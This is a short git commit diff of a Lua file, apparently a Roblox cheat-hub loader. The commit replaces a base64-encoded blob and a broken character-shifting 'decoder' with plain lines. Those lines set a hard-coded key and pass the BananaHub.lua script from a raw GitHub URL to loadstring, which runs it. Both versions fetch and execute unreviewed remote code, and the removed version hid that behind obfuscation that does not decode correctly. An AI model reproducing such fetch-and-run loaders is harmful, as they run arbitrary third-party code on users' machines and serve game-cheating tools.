62d37583597ebd85734c554697b8aaacf9075845
huy3636-hub <bhuy5820@gmail.com>
2026-04-29 16:00:54 +0700

    Refactor main.lua to load game script after initialization

--- main.lua
+++ main.lua
@@ -1,6 +1,3 @@
-local b = "cmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lOklzTG9hZGVkKCkgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KZ2V0Z2VudigpLktleSA9ICIyM2IwYTJhZDJjNTQyNDZiMzVjMTAwOWYiDQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29iaWl5ZXVlbS92dGhhbmdzaXRpbmsvbWFpbi9CYW5hbmFIdWIubHVhIikpKCk="
-local s = ""
-for i = 1, #b do
-    s = s .. string.char(string.byte(b:sub(i,i)) - 1)
-end
-loadstring(s)()
+repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
+getgenv().Key = "23b0a2ad2c54246b35c1009f"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
